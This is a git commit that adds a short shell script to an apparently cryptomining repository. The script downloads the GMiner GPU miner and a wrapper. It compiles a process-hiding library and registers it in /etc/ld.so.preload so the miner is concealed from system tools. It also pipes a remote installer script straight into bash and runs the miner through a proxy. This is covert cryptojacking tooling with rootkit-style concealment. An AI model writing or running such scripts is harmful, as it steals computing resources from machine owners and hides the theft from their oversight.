7a8cb13515df361c1ae353b051611ade5fa3def5
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-07-11 13:03:03 +0200

    Create start_gmi_bin_ws2.sh

---
+++ start_gmi_bin_ws2.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.58/gminer_2_58_linux64.tar.xz
+tar -xvf gminer_2_58_linux64.tar.xz
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/gmi_bin.sh
+chmod +x gmi_bin.sh
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicGmi.zip
+unzip magicGmi.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks2.sh | bash
+graftcp ./gmi_bin.sh
